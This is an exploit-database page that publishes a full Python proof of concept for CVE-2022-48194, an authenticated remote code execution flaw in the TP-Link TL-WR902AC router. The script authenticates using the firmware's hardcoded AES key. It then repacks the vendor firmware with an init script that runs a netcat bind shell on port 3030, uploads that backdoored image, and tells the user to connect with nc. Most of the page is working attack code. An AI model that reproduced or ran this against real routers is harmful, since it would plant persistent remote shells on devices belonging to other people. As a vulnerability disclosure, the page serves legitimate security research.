---
title: TP-Link TL-WR902AC firmware 210730 (V3) Remote Code Execution (RCE) (Authenticated)
url: https://cxsecurity.com/issue/WLB-2023040016
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-04
fetch_date: 2025-10-04T11:29:43.603162
---

# TP-Link TL-WR902AC firmware 210730 (V3) Remote Code Execution (RCE) (Authenticated)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **TP-Link TL-WR902AC firmware 210730 (V3) Remote Code Execution (RCE) (Authenticated)** **2023.04.03**  Credit:  **[Tobias Müller](https://cxsecurity.com/author/Tobias%2BM%C3%BCller/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-48194](https://cxsecurity.com/cveshow/CVE-2022-48194/ "Click to see CVE-2022-48194")**  CWE: **N/A** | |

# !/usr/bin/python3
# Exploit Title: TP-Link TL-WR902AC firmware 210730 (V3) - Remote Code Execution (RCE) (Authenticated)
# Exploit Author: Tobias Müller
# Date: 2022-12-01
# Version: TL-WR902AC(EU)\_V3\_0.9.1 Build 220329
# Vendor Homepage: https://www.tp-link.com/
# Tested On: TP-Link TL-WR902AC
# Vulnerability Description: Remote Code Execution via importing malicious firmware file
# CVE: CVE-2022-48194
# Technical Details: https://github.com/otsmr/internet-of-vulnerable-things
TARGET\_HOST = "192.168.0.1"
ADMIN\_PASSWORD = "admin"
TP\_LINK\_FIRMWARE\_DOWNLOAD = "https://static.tp-link.com/upload/firmware/2022/202208/20220803/TL-WR902AC(EU)\_V3\_220329.zip"
import requests
import os
import glob
import subprocess
import base64, os, hashlib
from Crypto.Cipher import AES, PKCS1\_v1\_5 # pip install pycryptodome
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
for program in ["binwalk", "fakeroot", "unsquashfs", "mksquashfs"]:
if "not found" in subprocess.check\_output(["which", program]).decode():
print(f"[!] need {program} to run")
exit(1)
class WebClient(object):
def \_\_init\_\_(self, host, password):
self.host = "http://" + host
self.password = password
self.password\_hash = hashlib.md5(('admin%s' % password.encode('utf-8')).encode('utf-8')).hexdigest()
self.aes\_key = "7765636728821987"
self.aes\_iv = "8775677306058909"
self.session = requests.Session()
crypto\_data = self.cgi\_basic("?8", "[/cgi/getParm#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n").text
self.sign\_rsa\_e = int(crypto\_data.split("\n")[1].split('"')[1], 16)
self.sign\_rsa\_n = int(crypto\_data.split("\n")[2].split('"')[1], 16)
self.seq = int(crypto\_data.split("\n")[3].split('"')[1])
self.jsessionid = self.get\_jsessionid()
def get\_jsessionid(self):
post\_data = f"8\r\n[/cgi/login#0,0,0,0,0,0#0,0,0,0,0,0]0,2\r\nusername=admin\r\npassword={self.password}\r\n"
self.get\_encrypted\_request\_data(post\_data, True)
return self.session.cookies["JSESSIONID"]
def aes\_encrypt(self, aes\_key, aes\_iv, aes\_block\_size, plaintext):
cipher = AES.new(aes\_key.encode('utf-8'), AES.MODE\_CBC, iv=aes\_iv.encode('utf-8'))
plaintext\_padded = pad(plaintext, aes\_block\_size)
return cipher.encrypt(plaintext\_padded)
def rsa\_encrypt(self, n, e, plaintext):
public\_key = RSA.construct((n, e)).publickey()
encryptor = PKCS1\_v1\_5.new(public\_key)
block\_size = int(public\_key.n.bit\_length() / 8) - 11
encrypted\_text = ''
for i in range(0, len(plaintext), block\_size):
encrypted\_text += encryptor.encrypt(plaintext[i:i + block\_size]).hex()
return encrypted\_text
def get\_encrypted\_request\_data(self, post\_data, is\_login: bool):
encrypted\_data = self.aes\_encrypt(self.aes\_key, self.aes\_iv, AES.block\_size, post\_data.encode('utf-8'))
encrypted\_data = base64.b64encode(encrypted\_data).decode()
self.seq += len(encrypted\_data)
signature = f"h={self.password\_hash}&s={self.seq}"
if is\_login:
signature = f"key={self.aes\_key}&iv={self.aes\_iv}&" + signature
encrypted\_signature = self.rsa\_encrypt(self.sign\_rsa\_n, self.sign\_rsa\_e, signature.encode('utf-8'))
body = f"sign={encrypted\_signature}\r\ndata={encrypted\_data}\r\n"
return self.cgi\_basic("\_gdpr", body)
def cgi\_basic(self, url: str, body: str):
res = self.session.post(f"{self.host}/cgi{url}", data=body, headers={
"Referer": "http://192.168.0.1/"
})
if res.status\_code != 200:
print(res.text)
raise ValueError("router not reachable")
return res
def cmd(command):
print("[\*] running " + command)
os.system(command)
def build\_backdoor():
if os.path.isdir("./tp\_tmp"):
cmd("rm -r -f ./tp\_tmp")
os.mkdir("./tp\_tmp")
os.chdir('./tp\_tmp')
print("[\*] downloading firmware")
res = requests.get(TP\_LINK\_FIRMWARE\_DOWNLOAD)
with open("firmware.zip", "wb") as f:
f.write(res.content)
print("[\*] downloading netcat")
#res = requests.get(NETCAT\_PRECOMPILED\_FILE)
#with open("netcat", "wb") as f:
# f.write(res.content)
if os.path.isfile("netcat"):
print("[!] netcat not found")
exit()
cmd('unzip firmware.zip')
filename = glob.glob("TL-\*.bin")[0]
cmd(f"mv '{filename}' firmware.bin")
cmd('binwalk --dd=".\*" firmware.bin')
cmd('fakeroot -s f.dat unsquashfs -d squashfs-root \_firmware.bin.extracted/160200')
with open("./squashfs-root/etc/init.d/back", "w") as f:
f.write("""
#!/bin/sh
while true;
do
netcat -l -p 3030 -e /bin/sh
sleep 5
done
""")
cmd("chmod +x ./squashfs-root/etc/init.d/back")
with open("./squashfs-root/etc/init.d/rcS", "r+") as f:
content = f.read()
content = content.replace("cos &", "/etc/init.d/back &\ncos &")
f.write(content)
cmd("cp netcat ./squashfs-root/usr/bin/")
cmd("chmod +x ./squashfs-root/usr/bin/netcat")
cmd("fakeroot -i f.dat mksquashfs squashfs-root backdoor.squashfs -comp xz -b 262144")
size = subprocess.check\_output(["file", "backdoor.squashfs"]).decode()
offset = int(size.split(" ")[9]) + 1442304
cmd("dd if=firmware.bin of=backdoor.bin bs=1 count=1442304")
cmd("dd if=backdoor.squashfs of=backdoor.bin bs=1 seek=1442304")
cmd(f"dd if=firmware.bin of=backdoor.bin bs=1 seek={offset} skip={offset}")
os.chdir('../')
cmd(f"mv ./tp\_tmp/backdoor.bin .")
cmd("rm -r -f ./tp\_tmp")
def upload\_backdoor():
wc = WebClient(TARGET\_HOST, ADMIN\_PASSWORD)
print("[\*] uploading backdoor")
files = {
'filename': open('backdoor.bin','rb')
}
re\_upload = requests.post("http://" + TARGET\_HOST + "/cgi/softup", cookies={
"JSESSIONID": wc.jsessionid
}, headers={
"Referer": "http://192.168.0.1/mainFrame.htm"
}, files=files)
if re\_upload.status\_code != 200 or "OK" not in re\_upload.text:
print("[!] error")
exit(1)
print("[\*] success!")
print("\nWait for router restart, then run:")
print("nc 192.168.0.1 3030")
build\_backdoor()
upload\_backdoor()

[**See this note in RAW Version**](https://cxsecurity....